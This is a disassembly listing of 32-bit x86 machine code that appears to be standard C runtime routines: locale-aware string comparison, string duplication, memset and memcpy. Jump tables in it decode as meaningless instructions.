  404225:	c6 46 0c 01          	movb   $0x1,0xc(%esi)
  404229:	eb 0a                	jmp    0x404235
  40422b:	8b 08                	mov    (%eax),%ecx
  40422d:	89 0e                	mov    %ecx,(%esi)
  40422f:	8b 40 04             	mov    0x4(%eax),%eax
  404232:	89 46 04             	mov    %eax,0x4(%esi)
  404235:	8b c6                	mov    %esi,%eax
  404237:	5e                   	pop    %esi
  404238:	5d                   	pop    %ebp
  404239:	c2 04 00             	ret    $0x4
  40423c:	80 79 0c 00          	cmpb   $0x0,0xc(%ecx)
  404240:	74 07                	je     0x404249
  404242:	8b 41 08             	mov    0x8(%ecx),%eax
  404245:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  404249:	c3                   	ret
  40424a:	8b c1                	mov    %ecx,%eax
  40424c:	c3                   	ret
  40424d:	8b ff                	mov    %edi,%edi
  40424f:	55                   	push   %ebp
  404250:	8b ec                	mov    %esp,%ebp
  404252:	83 ec 10             	sub    $0x10,%esp
  404255:	53                   	push   %ebx
  404256:	33 db                	xor    %ebx,%ebx
  404258:	56                   	push   %esi
  404259:	57                   	push   %edi
  40425a:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  40425d:	0f 84 d5 00 00 00    	je     0x404338
  404263:	ff 75 14             	push   0x14(%ebp)
  404266:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404269:	e8 47 ff ff ff       	call   0x4041b5
  40426e:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  404271:	75 2e                	jne    0x4042a1
  404273:	e8 11 32 00 00       	call   0x407489
  404278:	53                   	push   %ebx
  404279:	53                   	push   %ebx
  40427a:	53                   	push   %ebx
  40427b:	53                   	push   %ebx
  40427c:	53                   	push   %ebx
  40427d:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404283:	e8 cf 6b 00 00       	call   0x40ae57
  404288:	83 c4 14             	add    $0x14,%esp
  40428b:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  40428e:	74 07                	je     0x404297
  404290:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404293:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  404297:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40429c:	e9 99 00 00 00       	jmp    0x40433a
  4042a1:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4042a4:	3b fb                	cmp    %ebx,%edi
  4042a6:	74 cb                	je     0x404273
  4042a8:	be ff ff ff 7f       	mov    $0x7fffffff,%esi
  4042ad:	39 75 10             	cmp    %esi,0x10(%ebp)
  4042b0:	76 28                	jbe    0x4042da
  4042b2:	e8 d2 31 00 00       	call   0x407489
  4042b7:	53                   	push   %ebx
  4042b8:	53                   	push   %ebx
  4042b9:	53                   	push   %ebx
  4042ba:	53                   	push   %ebx
  4042bb:	53                   	push   %ebx
  4042bc:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4042c2:	e8 90 6b 00 00       	call   0x40ae57
  4042c7:	83 c4 14             	add    $0x14,%esp
  4042ca:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  4042cd:	74 07                	je     0x4042d6
  4042cf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4042d2:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  4042d6:	8b c6                	mov    %esi,%eax
  4042d8:	eb 60                	jmp    0x40433a
  4042da:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4042dd:	39 58 14             	cmp    %ebx,0x14(%eax)
  4042e0:	75 1d                	jne    0x4042ff
  4042e2:	ff 75 10             	push   0x10(%ebp)
  4042e5:	57                   	push   %edi
  4042e6:	ff 75 08             	push   0x8(%ebp)
  4042e9:	e8 92 69 00 00       	call   0x40ac80
  4042ee:	83 c4 0c             	add    $0xc,%esp
  4042f1:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  4042f4:	74 44                	je     0x40433a
  4042f6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4042f9:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  4042fd:	eb 3b                	jmp    0x40433a
  4042ff:	8b 45 08             	mov    0x8(%ebp),%eax
  404302:	0f b6 00             	movzbl (%eax),%eax
  404305:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404308:	51                   	push   %ecx
  404309:	50                   	push   %eax
  40430a:	e8 24 68 00 00       	call   0x40ab33
  40430f:	ff 45 08             	incl   0x8(%ebp)
  404312:	8b f0                	mov    %eax,%esi
  404314:	0f b6 07             	movzbl (%edi),%eax
  404317:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40431a:	51                   	push   %ecx
  40431b:	50                   	push   %eax
  40431c:	e8 12 68 00 00       	call   0x40ab33
  404321:	83 c4 10             	add    $0x10,%esp
  404324:	47                   	inc    %edi
  404325:	ff 4d 10             	decl   0x10(%ebp)
  404328:	74 08                	je     0x404332
  40432a:	3b f3                	cmp    %ebx,%esi
  40432c:	74 04                	je     0x404332
  40432e:	3b f0                	cmp    %eax,%esi
  404330:	74 cd                	je     0x4042ff
  404332:	2b f0                	sub    %eax,%esi
  404334:	8b c6                	mov    %esi,%eax
  404336:	eb b9                	jmp    0x4042f1
  404338:	33 c0                	xor    %eax,%eax
  40433a:	5f                   	pop    %edi
  40433b:	5e                   	pop    %esi
  40433c:	5b                   	pop    %ebx
  40433d:	c9                   	leave
  40433e:	c3                   	ret
  40433f:	8b ff                	mov    %edi,%edi
  404341:	55                   	push   %ebp
  404342:	8b ec                	mov    %esp,%ebp
  404344:	56                   	push   %esi
  404345:	33 f6                	xor    %esi,%esi
  404347:	39 35 b8 67 42 00    	cmp    %esi,0x4267b8
  40434d:	75 39                	jne    0x404388
  40434f:	39 75 08             	cmp    %esi,0x8(%ebp)
  404352:	75 1f                	jne    0x404373
  404354:	e8 30 31 00 00       	call   0x407489
  404359:	56                   	push   %esi
  40435a:	56                   	push   %esi
  40435b:	56                   	push   %esi
  40435c:	56                   	push   %esi
  40435d:	56                   	push   %esi
  40435e:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404364:	e8 ee 6a 00 00       	call   0x40ae57
  404369:	83 c4 14             	add    $0x14,%esp
  40436c:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  404371:	eb 27                	jmp    0x40439a
  404373:	39 75 0c             	cmp    %esi,0xc(%ebp)
  404376:	74 dc                	je     0x404354
  404378:	81 7d 10 ff ff ff 7f 	cmpl   $0x7fffffff,0x10(%ebp)
  40437f:	77 d3                	ja     0x404354
  404381:	5e                   	pop    %esi
  404382:	5d                   	pop    %ebp
  404383:	e9 f8 68 00 00       	jmp    0x40ac80
  404388:	56                   	push   %esi
  404389:	ff 75 10             	push   0x10(%ebp)
  40438c:	ff 75 0c             	push   0xc(%ebp)
  40438f:	ff 75 08             	push   0x8(%ebp)
  404392:	e8 b6 fe ff ff       	call   0x40424d
  404397:	83 c4 10             	add    $0x10,%esp
  40439a:	5e                   	pop    %esi
  40439b:	5d                   	pop    %ebp
  40439c:	c3                   	ret
  40439d:	8b ff                	mov    %edi,%edi
  40439f:	55                   	push   %ebp
  4043a0:	8b ec                	mov    %esp,%ebp
  4043a2:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4043a6:	74 17                	je     0x4043bf
  4043a8:	ff 75 1c             	push   0x1c(%ebp)
  4043ab:	ff 75 18             	push   0x18(%ebp)
  4043ae:	ff 75 14             	push   0x14(%ebp)
  4043b1:	ff 75 10             	push   0x10(%ebp)
  4043b4:	ff 75 0c             	push   0xc(%ebp)
  4043b7:	e8 34 69 00 00       	call   0x40acf0
  4043bc:	83 c4 14             	add    $0x14,%esp
  4043bf:	5d                   	pop    %ebp
  4043c0:	c3                   	ret
  4043c1:	8b ff                	mov    %edi,%edi
  4043c3:	55                   	push   %ebp
  4043c4:	8b ec                	mov    %esp,%ebp
  4043c6:	53                   	push   %ebx
  4043c7:	33 db                	xor    %ebx,%ebx
  4043c9:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4043cc:	75 04                	jne    0x4043d2
  4043ce:	33 c0                	xor    %eax,%eax
  4043d0:	eb 41                	jmp    0x404413
  4043d2:	56                   	push   %esi
  4043d3:	57                   	push   %edi
  4043d4:	ff 75 08             	push   0x8(%ebp)
  4043d7:	e8 24 6b 00 00       	call   0x40af00
  4043dc:	8b f0                	mov    %eax,%esi
  4043de:	46                   	inc    %esi
  4043df:	56                   	push   %esi
  4043e0:	e8 06 fd ff ff       	call   0x4040eb
  4043e5:	8b f8                	mov    %eax,%edi
  4043e7:	59                   	pop    %ecx
  4043e8:	59                   	pop    %ecx
  4043e9:	3b fb                	cmp    %ebx,%edi
  4043eb:	74 22                	je     0x40440f
  4043ed:	ff 75 08             	push   0x8(%ebp)
  4043f0:	56                   	push   %esi
  4043f1:	57                   	push   %edi
  4043f2:	e8 a1 6a 00 00       	call   0x40ae98
  4043f7:	83 c4 0c             	add    $0xc,%esp
  4043fa:	85 c0                	test   %eax,%eax
  4043fc:	74 0d                	je     0x40440b
  4043fe:	53                   	push   %ebx
  4043ff:	53                   	push   %ebx
  404400:	53                   	push   %ebx
  404401:	53                   	push   %ebx
  404402:	53                   	push   %ebx
  404403:	e8 e8 68 00 00       	call   0x40acf0
  404408:	83 c4 14             	add    $0x14,%esp
  40440b:	8b c7                	mov    %edi,%eax
  40440d:	eb 02                	jmp    0x404411
  40440f:	33 c0                	xor    %eax,%eax
  404411:	5f                   	pop    %edi
  404412:	5e                   	pop    %esi
  404413:	5b                   	pop    %ebx
  404414:	5d                   	pop    %ebp
  404415:	c3                   	ret
  404416:	3b 0d b8 50 42 00    	cmp    0x4250b8,%ecx
  40441c:	75 02                	jne    0x404420
  40441e:	f3 c3                	repz ret
  404420:	e9 66 6b 00 00       	jmp    0x40af8b
  404425:	8b ff                	mov    %edi,%edi
  404427:	55                   	push   %ebp
  404428:	8b ec                	mov    %esp,%ebp
  40442a:	83 ec 14             	sub    $0x14,%esp
  40442d:	56                   	push   %esi
  40442e:	ff 75 10             	push   0x10(%ebp)
  404431:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404434:	e8 7c fd ff ff       	call   0x4041b5
  404439:	8b 55 08             	mov    0x8(%ebp),%edx
  40443c:	33 f6                	xor    %esi,%esi
  40443e:	3b d6                	cmp    %esi,%edx
  404440:	75 2f                	jne    0x404471
  404442:	e8 42 30 00 00       	call   0x407489
  404447:	56                   	push   %esi
  404448:	56                   	push   %esi
  404449:	56                   	push   %esi
  40444a:	56                   	push   %esi
  40444b:	56                   	push   %esi
  40444c:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404452:	e8 00 6a 00 00       	call   0x40ae57
  404457:	83 c4 14             	add    $0x14,%esp
  40445a:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  40445e:	74 07                	je     0x404467
  404460:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404463:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  404467:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40446c:	e9 d7 01 00 00       	jmp    0x404648
  404471:	53                   	push   %ebx
  404472:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404475:	3b de                	cmp    %esi,%ebx
  404477:	75 2f                	jne    0x4044a8
  404479:	e8 0b 30 00 00       	call   0x407489
  40447e:	56                   	push   %esi
  40447f:	56                   	push   %esi
  404480:	56                   	push   %esi
  404481:	56                   	push   %esi
  404482:	56                   	push   %esi
  404483:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404489:	e8 c9 69 00 00       	call   0x40ae57
  40448e:	83 c4 14             	add    $0x14,%esp
  404491:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  404495:	74 07                	je     0x40449e
  404497:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40449a:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  40449e:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4044a3:	e9 9f 01 00 00       	jmp    0x404647
  4044a8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4044ab:	39 70 08             	cmp    %esi,0x8(%eax)
  4044ae:	75 24                	jne    0x4044d4
  4044b0:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4044b3:	50                   	push   %eax
  4044b4:	53                   	push   %ebx
  4044b5:	52                   	push   %edx
  4044b6:	e8 99 2c 00 00       	call   0x407154
  4044bb:	83 c4 0c             	add    $0xc,%esp
  4044be:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  4044c2:	0f 84 7f 01 00 00    	je     0x404647
  4044c8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4044cb:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  4044cf:	e9 73 01 00 00       	jmp    0x404647
  4044d4:	57                   	push   %edi
  4044d5:	bf 00 02 00 00       	mov    $0x200,%edi
  4044da:	66 0f b6 0a          	movzbw (%edx),%cx
  4044de:	0f b7 c9             	movzwl %cx,%ecx
  4044e1:	0f b6 f1             	movzbl %cl,%esi
  4044e4:	42                   	inc    %edx
  4044e5:	f6 44 06 1d 04       	testb  $0x4,0x1d(%esi,%eax,1)
  4044ea:	89 55 08             	mov    %edx,0x8(%ebp)
  4044ed:	74 5e                	je     0x40454d
  4044ef:	80 3a 00             	cmpb   $0x0,(%edx)
  4044f2:	75 04                	jne    0x4044f8
  4044f4:	33 f6                	xor    %esi,%esi
  4044f6:	eb 71                	jmp    0x404569
  4044f8:	6a 01                	push   $0x1
  4044fa:	ff 70 04             	push   0x4(%eax)
  4044fd:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  404500:	6a 02                	push   $0x2
  404502:	51                   	push   %ecx
  404503:	6a 02                	push   $0x2
  404505:	4a                   	dec    %edx
  404506:	52                   	push   %edx
  404507:	57                   	push   %edi
  404508:	ff 70 0c             	push   0xc(%eax)
  40450b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40450e:	50                   	push   %eax
  40450f:	e8 40 6f 00 00       	call   0x40b454
  404514:	83 c4 24             	add    $0x24,%esp
  404517:	83 f8 01             	cmp    $0x1,%eax
  40451a:	75 07                	jne    0x404523
  40451c:	66 0f b6 45 fc       	movzbw -0x4(%ebp),%ax
  404521:	eb 1f                	jmp    0x404542
  404523:	83 f8 02             	cmp    $0x2,%eax
  404526:	0f 85 d7 00 00 00    	jne    0x404603
  40452c:	66 0f b6 45 fc       	movzbw -0x4(%ebp),%ax
  404531:	b9 00 01 00 00       	mov    $0x100,%ecx
  404536:	66 0f af c1          	imul   %cx,%ax
  40453a:	66 0f b6 4d fd       	movzbw -0x3(%ebp),%cx
  40453f:	66 03 c1             	add    %cx,%ax
  404542:	ff 45 08             	incl   0x8(%ebp)
  404545:	0f b7 f0             	movzwl %ax,%esi
  404548:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40454b:	eb 1c                	jmp    0x404569
  40454d:	0f b7 d1             	movzwl %cx,%edx
  404550:	8d 0c 02             	lea    (%edx,%eax,1),%ecx
  404553:	f6 41 1d 10          	testb  $0x10,0x1d(%ecx)
  404557:	74 0d                	je     0x404566
  404559:	66 0f b6 89 1d 01 00 	movzbw 0x11d(%ecx),%cx
  404560:	00 
  404561:	0f b7 f1             	movzwl %cx,%esi
  404564:	eb 03                	jmp    0x404569
  404566:	0f b7 f2             	movzwl %dx,%esi
  404569:	66 0f b6 0b          	movzbw (%ebx),%cx
  40456d:	0f b7 c9             	movzwl %cx,%ecx
  404570:	0f b6 d1             	movzbl %cl,%edx
  404573:	43                   	inc    %ebx
  404574:	f6 44 02 1d 04       	testb  $0x4,0x1d(%edx,%eax,1)
  404579:	74 5a                	je     0x4045d5
  40457b:	80 3b 00             	cmpb   $0x0,(%ebx)
  40457e:	75 04                	jne    0x404584
  404580:	33 c9                	xor    %ecx,%ecx
  404582:	eb 6d                	jmp    0x4045f1
  404584:	6a 01                	push   $0x1
  404586:	ff 70 04             	push   0x4(%eax)
  404589:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40458c:	6a 02                	push   $0x2
  40458e:	51                   	push   %ecx
  40458f:	6a 02                	push   $0x2
  404591:	8d 4b ff             	lea    -0x1(%ebx),%ecx
  404594:	51                   	push   %ecx
  404595:	57                   	push   %edi
  404596:	ff 70 0c             	push   0xc(%eax)
  404599:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40459c:	50                   	push   %eax
  40459d:	e8 b2 6e 00 00       	call   0x40b454
  4045a2:	83 c4 24             	add    $0x24,%esp
  4045a5:	83 f8 01             	cmp    $0x1,%eax
  4045a8:	75 07                	jne    0x4045b1
  4045aa:	66 0f b6 45 fc       	movzbw -0x4(%ebp),%ax
  4045af:	eb 1b                	jmp    0x4045cc
  4045b1:	83 f8 02             	cmp    $0x2,%eax
  4045b4:	75 4d                	jne    0x404603
  4045b6:	66 0f b6 45 fc       	movzbw -0x4(%ebp),%ax
  4045bb:	b9 00 01 00 00       	mov    $0x100,%ecx
  4045c0:	66 0f af c1          	imul   %cx,%ax
  4045c4:	66 0f b6 4d fd       	movzbw -0x3(%ebp),%cx
  4045c9:	66 03 c1             	add    %cx,%ax
  4045cc:	0f b7 c8             	movzwl %ax,%ecx
  4045cf:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4045d2:	43                   	inc    %ebx
  4045d3:	eb 1c                	jmp    0x4045f1
  4045d5:	0f b7 d1             	movzwl %cx,%edx
  4045d8:	8d 0c 02             	lea    (%edx,%eax,1),%ecx
  4045db:	f6 41 1d 10          	testb  $0x10,0x1d(%ecx)
  4045df:	74 0d                	je     0x4045ee
  4045e1:	66 0f b6 89 1d 01 00 	movzbw 0x11d(%ecx),%cx
  4045e8:	00 
  4045e9:	0f b7 c9             	movzwl %cx,%ecx
  4045ec:	eb 03                	jmp    0x4045f1
  4045ee:	0f b7 ca             	movzwl %dx,%ecx
  4045f1:	66 3b ce             	cmp    %si,%cx
  4045f4:	75 2c                	jne    0x404622
  4045f6:	66 85 f6             	test   %si,%si
  4045f9:	74 3c                	je     0x404637
  4045fb:	8b 55 08             	mov    0x8(%ebp),%edx
  4045fe:	e9 d7 fe ff ff       	jmp    0x4044da
  404603:	e8 81 2e 00 00       	call   0x407489
  404608:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40460e:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  404612:	74 07                	je     0x40461b
  404614:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404617:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  40461b:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  404620:	eb 24                	jmp    0x404646
  404622:	1b c0                	sbb    %eax,%eax
  404624:	83 e0 02             	and    $0x2,%eax
  404627:	48                   	dec    %eax
  404628:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  40462c:	74 18                	je     0x404646
  40462e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404631:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  404635:	eb 0f                	jmp    0x404646
  404637:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  40463b:	74 07                	je     0x404644
  40463d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404640:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  404644:	33 c0                	xor    %eax,%eax
  404646:	5f                   	pop    %edi
  404647:	5b                   	pop    %ebx
  404648:	5e                   	pop    %esi
  404649:	c9                   	leave
  40464a:	c3                   	ret
  40464b:	8b ff                	mov    %edi,%edi
  40464d:	55                   	push   %ebp
  40464e:	8b ec                	mov    %esp,%ebp
  404650:	6a 00                	push   $0x0
  404652:	ff 75 0c             	push   0xc(%ebp)
  404655:	ff 75 08             	push   0x8(%ebp)
  404658:	e8 c8 fd ff ff       	call   0x404425
  40465d:	83 c4 0c             	add    $0xc,%esp
  404660:	5d                   	pop    %ebp
  404661:	c3                   	ret
  404662:	cc                   	int3
  404663:	cc                   	int3
  404664:	cc                   	int3
  404665:	cc                   	int3
  404666:	cc                   	int3
  404667:	cc                   	int3
  404668:	cc                   	int3
  404669:	cc                   	int3
  40466a:	cc                   	int3
  40466b:	cc                   	int3
  40466c:	cc                   	int3
  40466d:	cc                   	int3
  40466e:	cc                   	int3
  40466f:	cc                   	int3
  404670:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404674:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404678:	85 d2                	test   %edx,%edx
  40467a:	74 69                	je     0x4046e5
  40467c:	33 c0                	xor    %eax,%eax
  40467e:	8a 44 24 08          	mov    0x8(%esp),%al
  404682:	84 c0                	test   %al,%al
  404684:	75 16                	jne    0x40469c
  404686:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  40468c:	72 0e                	jb     0x40469c
  40468e:	83 3d a0 71 42 00 00 	cmpl   $0x0,0x4271a0
  404695:	74 05                	je     0x40469c
  404697:	e9 54 6e 00 00       	jmp    0x40b4f0
  40469c:	57                   	push   %edi
  40469d:	8b f9                	mov    %ecx,%edi
  40469f:	83 fa 04             	cmp    $0x4,%edx
  4046a2:	72 31                	jb     0x4046d5
  4046a4:	f7 d9                	neg    %ecx
  4046a6:	83 e1 03             	and    $0x3,%ecx
  4046a9:	74 0c                	je     0x4046b7
  4046ab:	2b d1                	sub    %ecx,%edx
  4046ad:	88 07                	mov    %al,(%edi)
  4046af:	83 c7 01             	add    $0x1,%edi
  4046b2:	83 e9 01             	sub    $0x1,%ecx
  4046b5:	75 f6                	jne    0x4046ad
  4046b7:	8b c8                	mov    %eax,%ecx
  4046b9:	c1 e0 08             	shl    $0x8,%eax
  4046bc:	03 c1                	add    %ecx,%eax
  4046be:	8b c8                	mov    %eax,%ecx
  4046c0:	c1 e0 10             	shl    $0x10,%eax
  4046c3:	03 c1                	add    %ecx,%eax
  4046c5:	8b ca                	mov    %edx,%ecx
  4046c7:	83 e2 03             	and    $0x3,%edx
  4046ca:	c1 e9 02             	shr    $0x2,%ecx
  4046cd:	74 06                	je     0x4046d5
  4046cf:	f3 ab                	rep stos %eax,%es:(%edi)
  4046d1:	85 d2                	test   %edx,%edx
  4046d3:	74 0a                	je     0x4046df
  4046d5:	88 07                	mov    %al,(%edi)
  4046d7:	83 c7 01             	add    $0x1,%edi
  4046da:	83 ea 01             	sub    $0x1,%edx
  4046dd:	75 f6                	jne    0x4046d5
  4046df:	8b 44 24 08          	mov    0x8(%esp),%eax
  4046e3:	5f                   	pop    %edi
  4046e4:	c3                   	ret
  4046e5:	8b 44 24 04          	mov    0x4(%esp),%eax
  4046e9:	c3                   	ret
  4046ea:	cc                   	int3
  4046eb:	cc                   	int3
  4046ec:	cc                   	int3
  4046ed:	cc                   	int3
  4046ee:	cc                   	int3
  4046ef:	cc                   	int3
  4046f0:	55                   	push   %ebp
  4046f1:	8b ec                	mov    %esp,%ebp
  4046f3:	57                   	push   %edi
  4046f4:	56                   	push   %esi
  4046f5:	8b 75 0c             	mov    0xc(%ebp),%esi
  4046f8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4046fb:	8b 7d 08             	mov    0x8(%ebp),%edi
  4046fe:	8b c1                	mov    %ecx,%eax
  404700:	8b d1                	mov    %ecx,%edx
  404702:	03 c6                	add    %esi,%eax
  404704:	3b fe                	cmp    %esi,%edi
  404706:	76 08                	jbe    0x404710
  404708:	3b f8                	cmp    %eax,%edi
  40470a:	0f 82 a4 01 00 00    	jb     0x4048b4
  404710:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  404716:	72 1f                	jb     0x404737
  404718:	83 3d a0 71 42 00 00 	cmpl   $0x0,0x4271a0
  40471f:	74 16                	je     0x404737
  404721:	57                   	push   %edi
  404722:	56                   	push   %esi
  404723:	83 e7 0f             	and    $0xf,%edi
  404726:	83 e6 0f             	and    $0xf,%esi
  404729:	3b fe                	cmp    %esi,%edi
  40472b:	5e                   	pop    %esi
  40472c:	5f                   	pop    %edi
  40472d:	75 08                	jne    0x404737
  40472f:	5e                   	pop    %esi
  404730:	5f                   	pop    %edi
  404731:	5d                   	pop    %ebp
  404732:	e9 8e 6f 00 00       	jmp    0x40b6c5
  404737:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40473d:	75 15                	jne    0x404754
  40473f:	c1 e9 02             	shr    $0x2,%ecx
  404742:	83 e2 03             	and    $0x3,%edx
  404745:	83 f9 08             	cmp    $0x8,%ecx
  404748:	72 2a                	jb     0x404774
  40474a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40474c:	ff 24 95 64 48 40 00 	jmp    *0x404864(,%edx,4)
  404753:	90                   	nop
  404754:	8b c7                	mov    %edi,%eax
  404756:	ba 03 00 00 00       	mov    $0x3,%edx
  40475b:	83 e9 04             	sub    $0x4,%ecx
  40475e:	72 0c                	jb     0x40476c
  404760:	83 e0 03             	and    $0x3,%eax
  404763:	03 c8                	add    %eax,%ecx
  404765:	ff 24 85 78 47 40 00 	jmp    *0x404778(,%eax,4)
  40476c:	ff 24 8d 74 48 40 00 	jmp    *0x404874(,%ecx,4)
  404773:	90                   	nop
  404774:	ff 24 8d f8 47 40 00 	jmp    *0x4047f8(,%ecx,4)
  40477b:	90                   	nop
  40477c:	88 47 40             	mov    %al,0x40(%edi)
  40477f:	00 b4 47 40 00 d8 47 	add    %dh,0x47d80040(%edi,%eax,2)
  404786:	40                   	inc    %eax
  404787:	00 23                	add    %ah,(%ebx)
  404789:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  40478f:	46                   	inc    %esi
  404790:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  404796:	02 c1                	add    %cl,%al
  404798:	e9 02 88 47 02       	jmp    0x287cf9f
  40479d:	83 c6 03             	add    $0x3,%esi
  4047a0:	83 c7 03             	add    $0x3,%edi
  4047a3:	83 f9 08             	cmp    $0x8,%ecx
  4047a6:	72 cc                	jb     0x404774
  4047a8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4047aa:	ff 24 95 64 48 40 00 	jmp    *0x404864(,%edx,4)
  4047b1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4047b4:	23 d1                	and    %ecx,%edx
  4047b6:	8a 06                	mov    (%esi),%al
  4047b8:	88 07                	mov    %al,(%edi)
  4047ba:	8a 46 01             	mov    0x1(%esi),%al
  4047bd:	c1 e9 02             	shr    $0x2,%ecx
  4047c0:	88 47 01             	mov    %al,0x1(%edi)
  4047c3:	83 c6 02             	add    $0x2,%esi
  4047c6:	83 c7 02             	add    $0x2,%edi
  4047c9:	83 f9 08             	cmp    $0x8,%ecx
  4047cc:	72 a6                	jb     0x404774
  4047ce:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4047d0:	ff 24 95 64 48 40 00 	jmp    *0x404864(,%edx,4)
  4047d7:	90                   	nop
  4047d8:	23 d1                	and    %ecx,%edx
  4047da:	8a 06                	mov    (%esi),%al
  4047dc:	88 07                	mov    %al,(%edi)
  4047de:	83 c6 01             	add    $0x1,%esi
  4047e1:	c1 e9 02             	shr    $0x2,%ecx
  4047e4:	83 c7 01             	add    $0x1,%edi
  4047e7:	83 f9 08             	cmp    $0x8,%ecx
  4047ea:	72 88                	jb     0x404774
  4047ec:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4047ee:	ff 24 95 64 48 40 00 	jmp    *0x404864(,%edx,4)
  4047f5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4047f8:	5b                   	pop    %ebx
  4047f9:	48                   	dec    %eax
  4047fa:	40                   	inc    %eax
  4047fb:	00 48 48             	add    %cl,0x48(%eax)
  4047fe:	40                   	inc    %eax
  4047ff:	00 40 48             	add    %al,0x48(%eax)
  404802:	40                   	inc    %eax
  404803:	00 38                	add    %bh,(%eax)
  404805:	48                   	dec    %eax
  404806:	40                   	inc    %eax
  404807:	00 30                	add    %dh,(%eax)
  404809:	48                   	dec    %eax
  40480a:	40                   	inc    %eax
  40480b:	00 28                	add    %ch,(%eax)
  40480d:	48                   	dec    %eax
  40480e:	40                   	inc    %eax
  40480f:	00 20                	add    %ah,(%eax)
  404811:	48                   	dec    %eax
  404812:	40                   	inc    %eax
  404813:	00 18                	add    %bl,(%eax)
  404815:	48                   	dec    %eax
  404816:	40                   	inc    %eax
  404817:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  40481d:	44                   	inc    %esp
  40481e:	8f                   	(bad)
  40481f:	e4 8b                	in     $0x8b,%al
  404821:	44                   	inc    %esp
  404822:	8e e8                	mov    %eax,%gs
  404824:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  404828:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  40482c:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  404830:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  404834:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  404838:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  40483c:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  404840:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  404844:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  404848:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  40484c:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  404850:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  404857:	03 f0                	add    %eax,%esi
  404859:	03 f8                	add    %eax,%edi
  40485b:	ff 24 95 64 48 40 00 	jmp    *0x404864(,%edx,4)
  404862:	8b ff                	mov    %edi,%edi
  404864:	74 48                	je     0x4048ae
  404866:	40                   	inc    %eax
